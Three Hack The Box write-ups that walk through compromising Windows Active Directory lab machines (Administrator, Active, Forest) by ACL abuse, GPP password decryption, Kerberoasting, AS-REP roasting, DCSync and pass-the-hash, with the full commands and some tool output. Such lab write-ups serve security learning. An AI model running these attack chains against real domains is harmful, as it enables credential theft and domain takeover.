entry.title: Hack The Box: Administrator
entry.content:
HTB Administrator

Overview

Target: Administrator
Platform: Hack The Box
Operating System: Windows
Domain: administrator.htb
Starting Credentials: olivia : ichliebedich

Administrator is a Grey Box Active Directory machine. We are given initial credentials for Olivia, allowing us to authenticate to the domain and begin enumerating Active Directory.

1. Initial Enumeration

Start with an Nmap scan to identify exposed services.

sudo nmap -sC -sV 10.129.8.62 --min-rate 1000

The important results are:

Port Service Significance
21 FTP File access and potential credential-dependent resources
53 DNS Domain name resolution
88 Kerberos Active Directory authentication
135 MSRPC Windows RPC
139, 445 NetBIOS/SMB Windows networking and file sharing
389 LDAP Active Directory queries
464 Kerberos password service Password operations
3268 LDAP Global Catalog Forest-wide directory searches
5985 WinRM Remote Windows management

The LDAP service identifies the domain as administrator.htb. The host is a Windows domain controller, making Active Directory enumeration the primary focus.

We also have initial credentials:

Username: Olivia
Password: ichliebedich

2. Gaining a Remote Session

Use Evil-WinRM to authenticate with the supplied credentials.

evil-winrm -i 10.129.8.62 -u olivia -p 'ichliebedich'

Once connected, transfer and execute SharpHound to collect Active Directory information.

.\SharpHound.exe

Download the resulting ZIP archive to Kali:

download .\20261022104836_BloodHound.zip

Import the archive into BloodHound and inspect Olivia’s outbound object-control relationships.

The graph reveals that Olivia has GenericAll over Michael’s user object.

This is our first opportunity for privilege escalation.

3. Olivia → Michael: Abusing GenericAll

Understanding GenericAll

GenericAll represents broad control over an AD object. When applied to a user object, it can allow an attacker to modify attributes and perform operations such as resetting the user’s password, subject to the object’s security configuration.

Because Olivia has GenericAll over Michael, we can reset Michael’s password and authenticate as him.

Use BloodyAD:

bloodyad -H administrator.htb \
  -u olivia -p 'ichliebedich' \
  set password michael 'password'

Expected result:

[+] Password changed successfully!

We now have credentials for Michael:

Username: michael
Password: password

The password shown here is the value used in the lab commands. In a real environment, a password reset should use a strong, unique value.

4. Michael → Benjamin: ForceChangePassword

Further inspection of BloodHound reveals that Michael has ForceChangePassword rights over Benjamin.

This permission allows Michael to reset Benjamin’s password without knowing Benjamin’s existing password.

Run:

bloodyad -H administrator.htb \
  -u michael -p 'password' \
  set password benjamin 'password'

Expected result:

[+] Password changed successfully!

We now have a second account:

Username: benjamin
Password: password

This is a straightforward example of ACL chaining: Olivia controls Michael, and Michael controls Benjamin. Neither relationship needs to grant domain-wide administrative privileges on its own.

5. Benjamin → Password Safe Database

The Nmap scan revealed FTP on port 21. Authenticate using Benjamin’s credentials:

ftp 10.129.8.62

At the prompts, enter:

Name: benjamin
Password: password

List the files:

ftp> ls

The server exposes:

Backup.psafe3

Download the file:

ftp> binary
ftp> get Backup.psafe3

Why binary mode? Backup.psafe3 is a binary Password Safe database. Using FTP’s default ASCII mode can modify line endings or otherwise corrupt a transferred file. Binary mode preserves the original bytes.

Extracting the password hash

Password Safe protects its database with a master password. We can extract the database’s password-verification material for offline cracking with John the Ripper.

pwsafe2john Backup.psafe3 > pwsafe.hash

The resulting hash begins with a structure similar to:

Backu:$pwsafe$*3*...

The extracted value is not the plaintext password. It is data that a password-cracking tool can use to verify candidate passwords.

Cracking the master password

Run John against the RockYou wordlist:

john pwsafe.hash \
  --wordlist=/usr/share/wordlists/rockyou.txt

John recovers master password

We now have the master password needed to open the Password Safe database.

Inspecting the database

Open Backup.psafe3 in a compatible Password Safe client and enter the recovered master password.

Inspect the saved entries for additional credentials.

6. Emily → Ethan: Making the Account Kerberoastable

After recovering Emily’s credentials, return to BloodHound and inspect her object-control relationships.

Emily has write permission over Ethan’s account. This enables modification of attributes on Ethan’s user object, including the servicePrincipalName attribute in this lab.

An account with an SPN can be targeted for Kerberoasting when the relevant conditions are met. Normally, an SPN identifies a service associated with an account. If an account lacks an SPN, an attacker with sufficient write permissions may be able to assign one and then request a service ticket for that account.

Set an SPN on Ethan:

bloodyad -H administrator.htb \
  -u emily -p '<REDACTED>' \
  set object ethan servicePrincipalName \
  -v 'hackthebox/ethan.account'

Expected output:

[+] ethan's servicePrincipalName has been updated

The SPN hackthebox/ethan.account is a chosen service identifier. Its purpose here is to associate an SPN with Ethan so that a service ticket can be requested for the account.

Important: This technique depends on Emily’s actual write permissions over Ethan’s object and the domain accepting the attribute change. It is not a universal requirement to create a new SPN for every Kerberoasting attack.

7. Kerberoasting Ethan

With an SPN configured, request Kerberos service tickets using Impacket’s GetUserSPNs.

impacket-GetUserSPNs administrator.htb/emily -request

Enter Emily’s password when prompted.

The output identifies Ethan:

ServicePrincipalName      Name
------------------------  ----
hackthebox/ethan.account  ethan

Impacket returns a TGS hash in $krb5tgs$23$... format.

This is a Kerberos 5 TGS-REP etype 23 ticket hash, which is compatible with Hashcat mode 13100.

Save the complete hash to hash.txt, then run:

hashcat -m 13100 hash.txt \
  /usr/share/wordlists/rockyou.txt

We now have Ethan’s credentials:

Username: ethan
Password: <REDACTED>

Why the attack works

Kerberoasting does not require the attacker to know the service account’s password. A domain user can request a service ticket for an account with an SPN, and the ticket contains material that can be attacked offline.

The security impact depends heavily on the account’s password strength. A weak password allows an attacker to recover the account secret without repeatedly guessing passwords against the domain controller.

In this case, the password is recovered and the next step is to inspect Ethan’s effective privileges.

8. Ethan → Domain Compromise: DCSync

BloodHound reveals that Ethan has replication-related rights over the administrator.htb domain, including the DCSync capability.

DCSync abuses Active Directory replication permissions to request password data from a domain controller through directory replication protocols. It does not require reading the NTDS.dit file directly from disk.

The relevant rights commonly include:

  • DS-Replication-Get-Changes

  • DS-Replication-Get-Changes-All

Depending on the domain and operation, additional replication rights may also appear in the graph.

The critical issue is that Ethan has sufficient replication permissions to retrieve sensitive credential material for the domain’s Administrator account.

Dump the Administrator credentials

Use Impacket’s secretsdump and request only the Administrator account:

impacket-secretsdump \
  administrator.htb/ethan:limpbizkit@10.129.8.62 \
  -just-dc-user administrator \
  -dc-ip 10.129.8.62

The output includes:

Administrator:500:<REDACTED>:<REDACTED>:::

Ethan’s replication rights allow us to retrieve the Administrator’s credential material directly, avoiding the need to crack the Administrator’s password.

9. Pass the Hash with Evil-WinRM

Instead of cracking the recovered NT hash, use it to authenticate with Evil-WinRM.

evil-winrm -i 10.129.8.62 \
  -u administrator \
  -H <REDACTED>

The -H option supplies the NT hash for pass-the-hash authentication.

Once authenticated, navigate to the Administrator Desktop:

cd C:\Users\Administrator\Desktop
ls

The directory contains:

root.txt

Retrieve the flag:

cat root.txt

This completes the machine.

Attack Chain Summary

Stage Technique Result
1 Initial credentials Remote session as Olivia
2 GenericAll ACL abuse Reset Michael’s password
3 ForceChangePassword Reset Benjamin’s password
4 FTP enumeration Download Backup.psafe3
5 Offline password cracking Recover Password Safe master password
6 Write permission over Ethan Add an SPN
7 Kerberoasting Recover Ethan’s password
8 DCSync Retrieve Administrator’s NT hash
9 Pass the hash Authenticate as Administrator

entry.title: Hack The Box: Active
entry.content:
HTB Active

Target: 10.129.8.52
Domain: active.htb
Operating System: Windows Server 2008 R2 SP1
Difficulty: Easy
Attack Path: SMB Enumeration → Group Policy Preferences (GPP) Password Disclosure → Service Account Access → Kerberoasting → Administrator Password Recovery

1. Port Scanning and Enumeration

Start with an Nmap scan to identify open ports, running services, and the target’s likely role.

nmap -sC -sV 10.129.8.52 --min-rate 1000

Important findings

Port Service Significance
53 DNS Domain name resolution
88 Kerberos Active Directory authentication
135 MSRPC Windows RPC services
139, 445 NetBIOS/SMB File shares and domain resources
389 LDAP Active Directory directory queries
464 Kerberos password service Password change operations
3268 Global Catalog Forest-wide directory queries

The LDAP service identifies the domain as active.htb, and the server hostname is DC. The combination of DNS, Kerberos, LDAP, and SMB strongly suggests that this machine is an Active Directory domain controller.

SMB signing is enabled and required. This is useful to record, although it does not prevent the credential-disclosure and Kerberoasting techniques used in this attack.

2. Enumerating SMB Shares

Attempt anonymous share enumeration:

smbclient -N -L '//10.129.8.52/'

The server permits anonymous authentication and reveals these shares:

Sharename       Type
---------       ----
ADMIN$          Disk
C$              Disk
IPC$            IPC
NETLOGON        Disk
Replication     Disk
SYSVOL          Disk
Users           Disk

The Replication share is particularly interesting because it may contain replicated domain files or configuration data. SYSVOL is also important because domain controllers store Group Policy objects and logon scripts there.

Inspect the Replication share

Connect without credentials:

smbclient -N '//10.129.8.52/Replication'

Enumerate the directory structure and navigate to:

active.htb/Policies/

Inside a Group Policy object’s directory, inspect:

{31B2F340-016D-11D2-945F-00C04FB984F9}/
    MACHINE/
        Preferences/
            Groups/
                Groups.xml

The GUID shown here is the default domain policy’s well-known GUID.

Retrieve the file:

get Groups.xml

3. Extracting the GPP Password

Inspect the downloaded XML:

cat Groups.xml

The relevant entry contains:

<User name="active.htb\SVC_TGS" ...>
    <Properties
        cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
        userName="active.htb\SVC_TGS"/>
</User>

The cpassword attribute contains an encrypted password associated with a Group Policy Preferences account configuration.

Historically, Group Policy Preferences could store passwords encrypted with a publicly documented AES key. Microsoft later addressed this insecure design, but old XML files can remain readable if they have not been removed.

Decrypt the password

Use Impacket’s gpp-decrypt utility:

gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'

Output:

GPPstillStandingStrong2k18

We now have credentials for:

Username: active.htb\SVC_TGS
Password: GPPstillStandingStrong2k18

Key lesson: This is not a password-cracking attack. The weakness is recoverable password storage in Group Policy Preferences.

4. Accessing the Users Share

Authenticate to the Users share using the recovered credentials:

smbclient '//10.129.8.52/Users' --user active.htb/svc_tgs

Enter the recovered password when prompted.

List the share contents:

ls

The listing includes directories such as:

Administrator/
All Users/
Default/
Default User/
Public/
SVC_TGS/

Navigate to the service account’s Desktop:

cd SVC_TGS
cd Desktop
ls

Download the user flag:

get user.txt

This confirms that the recovered service-account credentials provide access to the share and allow retrieval of the user flag.

Important distinction: Access to a share and possession of a user’s Windows logon session are not necessarily the same thing. SMB share permissions determine which files can be accessed; they do not automatically establish interactive access to the host.

5. Enumerating Kerberoastable Accounts

With valid domain credentials, enumerate accounts with Service Principal Names (SPNs) and request their service tickets:

impacket-GetUserSPNs active.htb/svc_tgs -request

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-19 00:36:40.351723  2026-10-22 11:28:56.155407             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$<RDACTED>

The account is also listed as a member of Group Policy Creator Owners.

Why is this interesting?

Kerberos uses Service Principal Names to associate services with accounts. A domain user with sufficient permissions can request a ticket for an SPN without knowing the target account’s password.

When the service runs under a user account, the returned TGS ticket contains encrypted data derived from that account’s secret. An attacker can save the ticket and attempt to crack it offline.

In this case, the SPN belongs to Administrator, making the ticket especially valuable.

6. Cracking the Administrator’s Kerberos Ticket

Run Hashcat against the RockYou wordlist:

└─$ hashcat hash.txt --wordlist /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 7.1+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 21.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================


Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$<REDACTED>:<PASSWORD>

This demonstrates Kerberoasting: requesting a service ticket using valid domain credentials and attempting to recover the service account’s password offline.

The attack is possible because the ticket can be requested legitimately, while password guesses are tested locally rather than sent repeatedly to the domain controller.

7. Authenticate as Administrator

Test the recovered credentials against the SMB Users share:

smbclient '//10.129.8.52/Users' --user active.htb/Administrator
Password for [ACTIVE.HTB\Administrator]:
Try "help" to get a list of possible commands.

smb: \> cd Administrator

smb: \Administrator\> cd Desktop

smb: \Administrator\Desktop\> get root.txt

getting file \Administrator\Desktop\root.txt of size 34 as root.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)

Attack Chain Summary

Anonymous SMB enumeration
        |
        v
Discover Replication share
        |
        v
Read Groups.xml in SYSVOL-style policy structure
        |
        v
Decrypt GPP cpassword
        |
        v
Recover SVC_TGS credentials
        |
        v
Access Users share and retrieve user.txt
        |
        v
Enumerate SPNs with GetUserSPNs
        |
        v
Request Administrator's TGS ticket
        |
        v
Crack ticket offline with Hashcat
        |
        v
Recover Administrator password
        |
        v
Authenticate to SMB as Administrator
        |
        v
Retrieve root.txt

entry.title: Hack The Box: Forest
entry.content:
HTB Forest

Overview

Target: Forest
Domain: htb.local
Domain Controller: FOREST.htb.local (10.129.95.210)
Operating System: Windows Server 2016 Standard
Initial Access: AS-REP roasting
Privilege Escalation: Abusing delegated Active Directory permissions to obtain DCSync rights
Tools: Nmap, Kerbrute, SMBClient, rpcclient, Impacket, Hashcat, BloodHound.py, BloodyAD, Evil-WinRM

1. Reconnaissance

I began by scanning the ports commonly associated with Active Directory:

nmap -sC -sV -p53,88,135,139,389,445,464,593,636,3268,3269,5985 10.129.95.210 --min-rate 1000
  
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-10-21 06:28:46Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2026-10-20T23:29:10-07:00
|_clock-skew: mean: 2h26m51s, deviation: 4h02m32s, median: 6m49s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-10-21T06:29:06
|_  start_date: 2026-10-21T06:26:16
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 58.78 seconds

The results identified a Windows Server 2016 host named FOREST, belonging to the htb.local domain. LDAP, Kerberos, SMB, the Global Catalog, and WinRM were accessible.

The most relevant findings were:

  • DNS (53), Kerberos (88), LDAP (389), and Global Catalog (3268) were exposed.
  • SMB (445) required message signing.
  • WinRM (5985) was available, making it a potential route for remote access once valid credentials were found.
  • The host’s FQDN was FOREST.htb.local.

User enumeration

My first Kerberos username-enumeration attempt with Kerbrute did not return useful results:

kerbrute userenum --dc 10.129.95.210 --domain htb.local \
  /opt/wordlists/statistically-likely-usernames/jsmith.txt

Anonymous SMB access was accepted, but listing shares did not reveal any shares:

smbclient -N -L '//10.129.95.210/'

Anonymous RPC enumeration, however, worked. I used rpcclient to query domain information and enumerate domain users:

rpcclient -U "" -N 10.129.95.210

At the RPC prompt:

rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]

Among the enumerated accounts was svc-alfresco, which became the focus of the next step.

2. Initial Access: AS-REP Roasting

I checked the enumerated usernames for accounts that did not require Kerberos pre-authentication:

impacket-GetNPUsers htb.local/ -usersfile ./users.list -no-pass

The output returned an AS-REP response for svc-alfresco. This indicated that the account was configured with the UF_DONT_REQUIRE_PREAUTH flag, allowing an attacker to request material that could be attacked offline without first knowing the account’s password.

I saved the returned hash and used Hashcat with the rockyou.txt wordlist. Hashcat identified the format as mode 18200 (Kerberos 5 AS-REP, etype 23) and successfully cracked it.

Access over WinRM

With the recovered svc-alfresco credentials, I connected to the host using Evil-WinRM:

evil-winrm -i 10.129.95.210 -u svc-alfresco -p '<password>'

I located user.txt on the account’s Desktop and captured the user flag.

3. Active Directory Enumeration with BloodHound

After obtaining a shell, I collected Active Directory data with bloodhound-python:

bloodhound-python --username svc-alfresco --password '<password>' \
  -d htb.local -dc FOREST.htb.local -ns 10.129.95.210 -c all

The collection retrieved domain, user, group, OU, GPO, and computer information. Some computer-related collection steps produced Kerberos errors, including clock skew, but the tool still collected substantial directory data.

I then examined the BloodHound relationships for svc-alfresco.

Two relationships stood out:

  1. The account could add itself to Exchange Windows Permissions.

  1. That group had WriteDACL over the domain root object.

The domain root was:

DC=HTB,DC=LOCAL

This was the pivotal finding. WriteDACL does not itself mean “Domain Admin”; it permits modification of an object’s discretionary access control list. When the target is the domain root, that ability can be used to grant additional directory permissions—including the replication rights required for DCSync.

4. Privilege Escalation: Group Membership and DCSync

Step 1: Add svc-alfresco to Exchange Windows Permissions

I used BloodyAD to add the account to the group identified in BloodHound:

bloodyad -H htb.local --username svc-alfresco --password '<password>' \
  add groupMember 'EXCHANGE WINDOWS PERMISSIONS' svc-alfresco

BloodyAD confirmed that the membership change succeeded.

This step relied on the account’s effective permissions over group membership. It was not a consequence of AS-REP roasting itself; the two findings formed separate stages of the attack chain.

Step 2: Grant DCSync rights

With the new group membership, I used BloodyAD to grant DCSync capability to svc-alfresco:

bloodyad -H htb.local --username svc-alfresco --password '<password>' \
  add dcsync 'svc-alfresco'

BloodyAD reported:

[+] svc-alfresco is now able to DCSync

DCSync abuses Active Directory’s directory-replication mechanisms. A principal with the necessary replication extended rights can request directory secret data from a domain controller. The relevant rights include Replicating Directory Changes and Replicating Directory Changes All.

5. Credential Access: DCSync

I then used Impacket’s secretsdump to request domain credential material:

impacket-secretsdump htb.local/svc-alfresco:'<password>'@10.129.95.210

The output included this warning:

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::

However, the tool continued with the DRSUAPI method and successfully returned the HTB\Administrator account’s NTLM hash.

6. Administrator Access and Root Flag

With the Administrator NTLM hash, I connected using Evil-WinRM’s hash-authentication option:

evil-winrm -i 10.129.95.210 -u administrator -H '<NTLM-hash>'

The login succeeded. I navigated to the Administrator profile’s Desktop and retrieved root.txt, completing the machine.

Attack Chain Summary

Anonymous RPC enumeration
        ↓
Identify svc-alfresco
        ↓
AS-REP roast the account
        ↓
Crack the hash offline
        ↓
WinRM access as svc-alfresco
        ↓
BloodHound reveals delegated permissions
        ↓
Add svc-alfresco to Exchange Windows Permissions
        ↓
Abuse WriteDACL on the domain root
        ↓
Grant DCSync rights to svc-alfresco
        ↓
Retrieve the Administrator NTLM hash
        ↓
WinRM as Administrator
        ↓
Root flag
